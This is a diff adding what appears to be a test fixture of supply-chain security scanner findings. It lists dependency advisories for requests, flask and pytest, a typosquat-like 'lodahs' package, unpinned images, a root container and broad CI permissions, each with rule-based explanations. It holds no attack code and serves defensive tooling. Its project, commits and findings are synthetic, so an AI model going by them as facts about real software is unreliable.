+   "id": "4a0cecf809d0",
+   "explanation": {
+    "finding_id": "4a0cecf809d0",
+    "claims": [
+     {
+      "text": "pkg:pypi/requests@2.25.1 matches advisory GHSA-9wx4-h78v-vm56 (Medium)",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_e6808ddfe2"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "runtime reachability of the vulnerable code is not established by static analysis",
+      "type": "unknown",
+      "evidence_ids": [],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Upgrading requests to >= 2.32.0 would remove this advisory match.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "vuln",
+   "subject": "pkg:pypi/requests@2.25.1",
+   "title": "requests@2.25.1: Requests has Insecure Temp File Reuse in its extract_zipped_paths() utility function",
+   "locator": "GHSA-gc5v-m9x4-r6x2",
+   "detector": "vulns",
+   "classification": "C",
+   "raw_evidence_ids": [
+    "ev_b82a11ae8e",
+    "ev_bac97f356d"
+   ],
+   "signals": {
+    "advisory_id": "GHSA-gc5v-m9x4-r6x2",
+    "aliases": [
+     "CVE-2026-25645",
+     "PYSEC-2026-2275"
+    ],
+    "cves": [
+     "CVE-2026-25645"
+    ],
+    "cvss": 4.4,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:N",
+    "severity_band": "Medium",
+    "fixed_versions": [
+     "2.33.0"
+    ],
+    "kev": false,
+    "kev_source": "cache",
+    "epss": 0.00306,
+    "epss_source": "live",
+    "path": [
+     "pkg:pypi/requests@2.25.1"
+    ],
+    "all_paths": [
+     [
+      "pkg:pypi/requests@2.25.1"
+     ]
+    ],
+    "direct": true,
+    "scope": "prod",
+    "imported_by": [
+     "app/utils/helpers.py:2",
+     "app/utils/helpers.py:6"
+    ],
+    "statically_referenced": true,
+    "exposed_routes": [
+     "route:POST /checkout"
+    ],
+    "reachability": "unknown",
+    "source": "live",
+    "published": "2026-03-25T16:56:28Z",
+    "summary": "Requests has Insecure Temp File Reuse in its extract_zipped_paths() utility function",
+    "axes": {
+     "severity_band": "Medium",
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Known vulnerability",
+   "band": "P2",
+   "band_reason": "medium severity in runtime scope",
+   "status": "open",
+   "id": "04f8f24304a3",
+   "explanation": {
+    "finding_id": "04f8f24304a3",
+    "claims": [
+     {
+      "text": "pkg:pypi/requests@2.25.1 matches advisory GHSA-gc5v-m9x4-r6x2 (Medium)",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_b82a11ae8e"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "runtime reachability of the vulnerable code is not established by static analysis",
+      "type": "unknown",
+      "evidence_ids": [],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Upgrading requests to >= 2.33.0 would remove this advisory match.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "vuln",
+   "subject": "pkg:pypi/requests@2.25.1",
+   "title": "requests@2.25.1: Requests vulnerable to .netrc credentials leak via malicious URLs",
+   "locator": "GHSA-9hjg-9r4m-mvj7",
+   "detector": "vulns",
+   "classification": "C",
+   "raw_evidence_ids": [
+    "ev_76b962875f",
+    "ev_bac97f356d"
+   ],
+   "signals": {
+    "advisory_id": "GHSA-9hjg-9r4m-mvj7",
+    "aliases": [
+     "CVE-2024-47081",
+     "PYSEC-2026-1872"
+    ],
+    "cves": [
+     "CVE-2024-47081"
+    ],
+    "cvss": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N",
+    "severity_band": "Medium",
+    "fixed_versions": [
+     "2.32.4"
+    ],
+    "kev": false,
+    "kev_source": "cache",
+    "epss": 0.01022,
+    "epss_source": "live",
+    "path": [
+     "pkg:pypi/requests@2.25.1"
+    ],
+    "all_paths": [
+     [
+      "pkg:pypi/requests@2.25.1"
+     ]
+    ],
+    "direct": true,
+    "scope": "prod",
+    "imported_by": [
+     "app/utils/helpers.py:2",
+     "app/utils/helpers.py:6"
+    ],
+    "statically_referenced": true,
+    "exposed_routes": [
+     "route:POST /checkout"
+    ],
+    "reachability": "unknown",
+    "source": "live",
+    "published": "2025-06-09T19:06:08Z",
+    "summary": "Requests vulnerable to .netrc credentials leak via malicious URLs",
+    "axes": {
+     "severity_band": "Medium",
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Known vulnerability",
+   "band": "P2",
+   "band_reason": "medium severity in runtime scope",
+   "status": "open",
+   "id": "daa08407fb8f",
+   "explanation": {
+    "finding_id": "daa08407fb8f",
+    "claims": [
+     {
+      "text": "pkg:pypi/requests@2.25.1 matches advisory GHSA-9hjg-9r4m-mvj7 (Medium)",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_76b962875f"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "runtime reachability of the vulnerable code is not established by static analysis",
+      "type": "unknown",
+      "evidence_ids": [],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Upgrading requests to >= 2.32.4 would remove this advisory match.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "vuln",
+   "subject": "pkg:pypi/requests@2.25.1",
+   "title": "requests@2.25.1: Unintended leak of Proxy-Authorization header in requests",
+   "locator": "GHSA-j8r2-6x86-q33q",
+   "detector": "vulns",
+   "classification": "C",
+   "raw_evidence_ids": [
+    "ev_a04995919a",
+    "ev_bac97f356d"
+   ],
+   "signals": {
+    "advisory_id": "GHSA-j8r2-6x86-q33q",
+    "aliases": [
+     "CVE-2023-32681",
+     "PYSEC-2023-74"
+    ],
+    "cves": [
+     "CVE-2023-32681"
+    ],
+    "cvss": 6.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N",
+    "severity_band": "Medium",
+    "fixed_versions": [
+     "2.31.0"
+    ],
+    "kev": false,
+    "kev_source": "cache",
+    "epss": 0.02974,
+    "epss_source": "live",
+    "path": [
+     "pkg:pypi/requests@2.25.1"
+    ],
+    "all_paths": [
+     [
+      "pkg:pypi/requests@2.25.1"
+     ]
+    ],
+    "direct": true,
+    "scope": "prod",
+    "imported_by": [
+     "app/utils/helpers.py:2",
+     "app/utils/helpers.py:6"
+    ],
+    "statically_referenced": true,
+    "exposed_routes": [
+     "route:POST /checkout"
+    ],
+    "reachability": "unknown",
+    "source": "live",
+    "published": "2023-05-22T20:36:32Z",
+    "summary": "Unintended leak of Proxy-Authorization header in requests",
+    "axes": {
+     "severity_band": "Medium",
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Known vulnerability",
+   "band": "P2",
+   "band_reason": "medium severity in runtime scope",
+   "status": "open",
+   "id": "5309e4d30842",
+   "explanation": {
+    "finding_id": "5309e4d30842",
+    "claims": [
+     {
+      "text": "pkg:pypi/requests@2.25.1 matches advisory GHSA-j8r2-6x86-q33q (Medium)",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_a04995919a"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "runtime reachability of the vulnerable code is not established by static analysis",
+      "type": "unknown",
+      "evidence_ids": [],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Upgrading requests to >= 2.31.0 would remove this advisory match.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "vuln",
+   "subject": "pkg:pypi/flask@2.0.1",
+   "title": "flask@2.0.1: Flask session does not add `Vary: Cookie` header when accessed in some ways",
+   "locator": "GHSA-68rp-wp8r-4726",
+   "detector": "vulns",
+   "classification": "C",
+   "raw_evidence_ids": [
+    "ev_3344532af3",
+    "ev_75f69486c2"
+   ],
+   "signals": {
+    "advisory_id": "GHSA-68rp-wp8r-4726",
+    "aliases": [
+     "CVE-2026-27205",
+     "PYSEC-2026-2151"
+    ],
+    "cves": [
+     "CVE-2026-27205"
+    ],
+    "cvss": null,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+    "severity_band": "Low",
+    "fixed_versions": [
+     "3.1.3"
+    ],
+    "kev": false,
+    "kev_source": "cache",
+    "epss": 0.00394,
+    "epss_source": "live",
+    "path": [
+     "pkg:pypi/flask@2.0.1"
+    ],
+    "all_paths": [
+     [
+      "pkg:pypi/flask@2.0.1"
+     ]
+    ],
+    "direct": true,
+    "scope": "prod",
+    "imported_by": [
+     "app/__init__.py:2",
+     "app/__init__.py:4",
+     "app/api/routes.py:2",
+     "app/api/routes.py:14"
+    ],
+    "statically_referenced": true,
+    "exposed_routes": [
+     "route:POST /checkout"
+    ],
+    "reachability": "unknown",
+    "source": "live",
+    "published": "2026-02-19T20:45:41Z",
+    "summary": "Flask session does not add `Vary: Cookie` header when accessed in some ways",
+    "axes": {
+     "severity_band": "Low",
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Known vulnerability",
+   "band": "P3",
+   "band_reason": "low severity in prod scope",
+   "status": "open",
+   "id": "f09483111d4a",
+   "explanation": {
+    "finding_id": "f09483111d4a",
+    "claims": [
+     {
+      "text": "pkg:pypi/flask@2.0.1 matches advisory GHSA-68rp-wp8r-4726 (Low)",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_3344532af3"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "runtime reachability of the vulnerable code is not established by static analysis",
+      "type": "unknown",
+      "evidence_ids": [],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Upgrading flask to >= 3.1.3 would remove this advisory match.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "vuln",
+   "subject": "pkg:pypi/pytest@7.0.0",
+   "title": "pytest@7.0.0: pytest has vulnerable tmpdir handling",
+   "locator": "GHSA-6w46-j5rx-g56g",
+   "detector": "vulns",
+   "classification": "C",
+   "raw_evidence_ids": [
+    "ev_be04b0073e",
+    "ev_548ddbbb8e"
+   ],
+   "signals": {
+    "advisory_id": "GHSA-6w46-j5rx-g56g",
+    "aliases": [
+     "CVE-2025-71176",
+     "PYSEC-2026-1845"
+    ],
+    "cves": [
+     "CVE-2025-71176"
+    ],
+    "cvss": 6.8,
+    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+    "severity_band": "Medium",
+    "fixed_versions": [
+     "9.0.3"
+    ],
+    "kev": false,
+    "kev_source": "cache",
+    "epss": 0.00154,
+    "epss_source": "live",
+    "path": [
+     "pkg:pypi/pytest@7.0.0"
+    ],
+    "all_paths": [
+     [
+      "pkg:pypi/pytest@7.0.0"
+     ]
+    ],
+    "direct": true,
+    "scope": "dev",
+    "imported_by": [],
+    "statically_referenced": false,
+    "exposed_routes": [],
+    "reachability": "unknown",
+    "source": "live",
+    "published": "2026-01-22T06:30:29Z",
+    "summary": "pytest has vulnerable tmpdir handling",
+    "axes": {
+     "severity_band": "Medium",
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "Low",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Known vulnerability",
+   "band": "P3",
+   "band_reason": "medium severity in dev scope",
+   "status": "open",
+   "id": "38b13d9efa90",
+   "explanation": {
+    "finding_id": "38b13d9efa90",
+    "claims": [
+     {
+      "text": "pkg:pypi/pytest@7.0.0 matches advisory GHSA-6w46-j5rx-g56g (Medium)",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_be04b0073e"
+      ],
+      "confidence": "high",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "runtime reachability of the vulnerable code is not established by static analysis",
+      "type": "unknown",
+      "evidence_ids": [],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Upgrading pytest to >= 9.0.3 would remove this advisory match.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "discrepancy",
+   "subject": "pkg:pypi/colorama",
+   "title": "'colorama' declared but never imported",
+   "locator": "package:pkg:pypi/colorama",
+   "detector": "discrepancies",
+   "classification": "W",
+   "raw_evidence_ids": [
+    "ev_310bffbe3d"
+   ],
+   "signals": {
+    "signal": "declared_not_imported",
+    "package": "pkg:pypi/colorama",
+    "name": "colorama",
+    "ecosystem": "pypi",
+    "declared": true,
+    "resolved": true,
+    "imported": false,
+    "status": "declared-not-imported",
+    "declared_scopes": [
+     "prod"
+    ],
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Unexpected dependency",
+   "band": "P3",
+   "band_reason": "cross-layer discrepancy (informational)",
+   "status": "open",
+   "id": "db7961523076",
+   "explanation": {
+    "finding_id": "db7961523076",
+    "claims": [
+     {
+      "text": "'colorama' declared but never imported",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_310bffbe3d"
+      ],
+      "confidence": "medium",
+      "verifier_status": "downgraded",
+      "reason": "fact cited only derived evidence"
+     },
+     {
+      "text": "signal is consistent with: Unexpected dependency (classification W)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_310bffbe3d"
+      ],
+      "confidence": "low",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Removing the unused declaration would shrink the attack surface.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "discrepancy",
+   "subject": "pkg:npm/debug",
+   "title": "'debug' declared but never imported",
+   "locator": "package:pkg:npm/debug",
+   "detector": "discrepancies",
+   "classification": "W",
+   "raw_evidence_ids": [
+    "ev_150c1777ae"
+   ],
+   "signals": {
+    "signal": "declared_not_imported",
+    "package": "pkg:npm/debug",
+    "name": "debug",
+    "ecosystem": "npm",
+    "declared": true,
+    "resolved": true,
+    "imported": false,
+    "status": "declared-not-imported",
+    "declared_scopes": [
+     "prod"
+    ],
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Unexpected dependency",
+   "band": "P3",
+   "band_reason": "cross-layer discrepancy (informational)",
+   "status": "open",
+   "id": "d6f4a645ff82",
+   "explanation": {
+    "finding_id": "d6f4a645ff82",
+    "claims": [
+     {
+      "text": "'debug' declared but never imported",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_150c1777ae"
+      ],
+      "confidence": "medium",
+      "verifier_status": "downgraded",
+      "reason": "fact cited only derived evidence"
+     },
+     {
+      "text": "signal is consistent with: Unexpected dependency (classification W)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_150c1777ae"
+      ],
+      "confidence": "low",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Removing the unused declaration would shrink the attack surface.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "discrepancy",
+   "subject": "pkg:npm/lodahs",
+   "title": "'lodahs' declared but never imported",
+   "locator": "package:pkg:npm/lodahs",
+   "detector": "discrepancies",
+   "classification": "W",
+   "raw_evidence_ids": [
+    "ev_459d2de17c"
+   ],
+   "signals": {
+    "signal": "declared_not_imported",
+    "package": "pkg:npm/lodahs",
+    "name": "lodahs",
+    "ecosystem": "npm",
+    "declared": true,
+    "resolved": true,
+    "imported": false,
+    "status": "declared-not-imported",
+    "declared_scopes": [
+     "prod"
+    ],
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 1,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Unexpected dependency",
+   "band": "P3",
+   "band_reason": "cross-layer discrepancy (informational)",
+   "status": "open",
+   "id": "ea9f00c66112",
+   "explanation": {
+    "finding_id": "ea9f00c66112",
+    "claims": [
+     {
+      "text": "'lodahs' declared but never imported",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_459d2de17c"
+      ],
+      "confidence": "medium",
+      "verifier_status": "downgraded",
+      "reason": "fact cited only derived evidence"
+     },
+     {
+      "text": "signal is consistent with: Unexpected dependency (classification W)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_459d2de17c"
+      ],
+      "confidence": "low",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Removing the unused declaration would shrink the attack surface.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "container",
+   "subject": "node:latest",
+   "title": "Base image uses the mutable 'latest' tag (or no tag): node:latest",
+   "locator": "Dockerfile:1",
+   "detector": "container",
+   "classification": "W",
+   "raw_evidence_ids": [
+    "ev_e6fef40e32"
+   ],
+   "signals": {
+    "rule": "DF001",
+    "detail": "node:latest",
+    "image": "node:latest",
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "Medium",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Untrusted or mutable image",
+   "band": "P3",
+   "band_reason": "weak Untrusted or mutable image signal",
+   "status": "open",
+   "id": "6f587314ff39",
+   "explanation": {
+    "finding_id": "6f587314ff39",
+    "claims": [
+     {
+      "text": "Base image uses the mutable 'latest' tag (or no tag): node:latest",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_e6fef40e32"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: Untrusted or mutable image (classification W)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_e6fef40e32"
+      ],
+      "confidence": "low",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Pinning the base image to a version tag and digest would make builds reproducible.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "ci",
+   "subject": ".github/workflows/ci.yml",
+   "title": "Broad or missing workflow permissions: permissions=write-all",
+   "locator": ".github/workflows/ci.yml:permissions",
+   "detector": "ci",
+   "classification": "W",
+   "raw_evidence_ids": [
+    "ev_f50e1a49c0"
+   ],
+   "signals": {
+    "rule": "CI003",
+    "detail": "permissions=write-all",
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "Medium",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Excessive CI permissions",
+   "band": "P3",
+   "band_reason": "weak Excessive CI permissions signal",
+   "status": "open",
+   "id": "dd4c6256791b",
+   "explanation": {
+    "finding_id": "dd4c6256791b",
+    "claims": [
+     {
+      "text": "Broad or missing workflow permissions: permissions=write-all",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_f50e1a49c0"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: Excessive CI permissions (classification W)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_f50e1a49c0"
+      ],
+      "confidence": "low",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Declaring least-privilege `permissions:` would limit token scope.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "container",
+   "subject": "postgres:16",
+   "title": "Compose service image not pinned by digest: db -> postgres:16",
+   "locator": "docker-compose.yml:8",
+   "detector": "container",
+   "classification": "W",
+   "raw_evidence_ids": [
+    "ev_3eb2f26f34"
+   ],
+   "signals": {
+    "rule": "DC001",
+    "detail": "db -> postgres:16",
+    "image": "postgres:16",
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "Medium",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Untrusted or mutable image",
+   "band": "P3",
+   "band_reason": "weak Untrusted or mutable image signal",
+   "status": "open",
+   "id": "e8a6cbf13c93",
+   "explanation": {
+    "finding_id": "e8a6cbf13c93",
+    "claims": [
+     {
+      "text": "Compose service image not pinned by digest: db -> postgres:16",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_3eb2f26f34"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: Untrusted or mutable image (classification W)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_3eb2f26f34"
+      ],
+      "confidence": "low",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Pinning the compose image by digest would make it immutable.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "container",
+   "subject": "Dockerfile",
+   "title": "Container runs as root (no USER, or USER root): final stage user=unset",
+   "locator": "Dockerfile:1",
+   "detector": "container",
+   "classification": "W",
+   "raw_evidence_ids": [
+    "ev_071cfeb260"
+   ],
+   "signals": {
+    "rule": "DF003",
+    "detail": "final stage user=unset",
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "Medium",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Container privilege",
+   "band": "P3",
+   "band_reason": "weak Container privilege signal",
+   "status": "open",
+   "id": "d638be0a0393",
+   "explanation": {
+    "finding_id": "d638be0a0393",
+    "claims": [
+     {
+      "text": "Container runs as root (no USER, or USER root): final stage user=unset",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_071cfeb260"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: Container privilege (classification W)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_071cfeb260"
+      ],
+      "confidence": "low",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Adding a non-root USER would drop container privileges.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "anomaly",
+   "subject": "debug",
+   "title": "Major version jump debug 2.6.9 -> 4.3.4",
+   "locator": "commit:70459f7c12fd50248548b91108db1d743890a6d3",
+   "detector": "changes",
+   "classification": "W",
+   "raw_evidence_ids": [
+    "ev_6ad9475faa"
+   ],
+   "signals": {
+    "signal": "large_version_jump",
+    "from": "2.6.9",
+    "to": "4.3.4",
+    "commit": "70459f7c12fd50248548b91108db1d743890a6d3",
+    "ecosystem": "npm",
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Suspicious package update",
+   "band": "P3",
+   "band_reason": "weak Suspicious package update signal",
+   "status": "open",
+   "id": "f785ab090bad",
+   "explanation": {
+    "finding_id": "f785ab090bad",
+    "claims": [
+     {
+      "text": "Major version jump debug 2.6.9 -> 4.3.4",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_6ad9475faa"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: Suspicious package update (classification W)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_6ad9475faa"
+      ],
+      "confidence": "low",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": null,
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "anomaly",
+   "subject": "colorama",
+   "title": "New dependency 'colorama' added in 70459f7",
+   "locator": "commit:70459f7c12fd50248548b91108db1d743890a6d3",
+   "detector": "changes",
+   "classification": "W",
+   "raw_evidence_ids": [
+    "ev_605c481ec7"
+   ],
+   "signals": {
+    "signal": "new_dependency",
+    "commit": "70459f7c12fd50248548b91108db1d743890a6d3",
+    "author": "Fixture Bot",
+    "date": "2026-11-12T10:00:00Z",
+    "message": "add analytics, bump deps",
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Unexpected dependency",
+   "band": "P3",
+   "band_reason": "weak Unexpected dependency signal",
+   "status": "open",
+   "id": "ee27d30deb96",
+   "explanation": {
+    "finding_id": "ee27d30deb96",
+    "claims": [
+     {
+      "text": "New dependency 'colorama' added in 70459f7",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_605c481ec7"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: Unexpected dependency (classification W)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_605c481ec7"
+      ],
+      "confidence": "low",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": null,
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "anomaly",
+   "subject": "lodahs",
+   "title": "New dependency 'lodahs' added in df87b2a",
+   "locator": "commit:df87b2a5e64ecef617911cdb8a88084d74831dd3",
+   "detector": "changes",
+   "classification": "W",
+   "raw_evidence_ids": [
+    "ev_8285d73c9a"
+   ],
+   "signals": {
+    "signal": "new_dependency",
+    "commit": "df87b2a5e64ecef617911cdb8a88084d74831dd3",
+    "author": "Fixture Bot",
+    "date": "2026-11-15T10:00:00Z",
+    "message": "feat: setup hooks",
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 1,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Unexpected dependency",
+   "band": "P3",
+   "band_reason": "weak Unexpected dependency signal",
+   "status": "open",
+   "id": "67f9c1d35ce2",
+   "explanation": {
+    "finding_id": "67f9c1d35ce2",
+    "claims": [
+     {
+      "text": "New dependency 'lodahs' added in df87b2a",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_8285d73c9a"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: Unexpected dependency (classification W)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_8285d73c9a"
+      ],
+      "confidence": "low",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": null,
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "ci",
+   "subject": "actions/checkout@v4",
+   "title": "Third-party action pinned to a tag/branch, not a commit SHA: actions/checkout@v4",
+   "locator": ".github/workflows/ci.yml:8",
+   "detector": "ci",
+   "classification": "W",
+   "raw_evidence_ids": [
+    "ev_1858fe0c8f"
+   ],
+   "signals": {
+    "rule": "CI001",
+    "detail": "actions/checkout@v4",
+    "action": "actions/checkout",
+    "ref": "v4",
+    "first_party": true,
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "Medium",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Unpinned third-party action",
+   "band": "P3",
+   "band_reason": "weak Unpinned third-party action signal",
+   "status": "open",
+   "id": "5e718d7e89f3",
+   "explanation": {
+    "finding_id": "5e718d7e89f3",
+    "claims": [
+     {
+      "text": "Third-party action pinned to a tag/branch, not a commit SHA: actions/checkout@v4",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_1858fe0c8f"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: Unpinned third-party action (classification W)",
+      "type": "inference",
+      "evidence_ids": [
+       "ev_1858fe0c8f"
+      ],
+      "confidence": "low",
+      "verifier_status": "verified",
+      "reason": null
+     }
+    ],
+    "counterfactual": "Pinning the action to a full commit SHA would make it immutable.",
+    "notes": "rule-based explanation",
+    "generated_by": "rule-based",
+    "tool_calls": []
+   }
+  },
+  {
+   "cls": "anomaly",
+   "subject": "pkg:npm/mkdirp@0.5.1",
+   "title": "mkdirp@0.5.1 is deprecated",
+   "locator": "registry:pkg:npm/mkdirp@0.5.1",
+   "detector": "registry",
+   "classification": "W",
+   "raw_evidence_ids": [
+    "ev_ca9a8bbeaa"
+   ],
+   "signals": {
+    "signal": "deprecated",
+    "scope": "prod",
+    "axes": {
+     "severity_band": null,
+     "exploitability": "unknown",
+     "trust_alerts": 0,
+     "context": "High",
+     "confidence": "low"
+    }
+   },
+   "attack_class": "Abandoned dependency",
+   "band": "P3",
+   "band_reason": "weak Abandoned dependency signal",
+   "status": "open",
+   "id": "c1d59932e903",
+   "explanation": {
+    "finding_id": "c1d59932e903",
+    "claims": [
+     {
+      "text": "mkdirp@0.5.1 is deprecated",
+      "type": "fact",
+      "evidence_ids": [
+       "ev_ca9a8bbeaa"
+      ],
+      "confidence": "medium",
+      "verifier_status": "verified",
+      "reason": null
+     },
+     {
+      "text": "signal is consistent with: Abandoned dependency (classification W)",
+      "type": "inference",
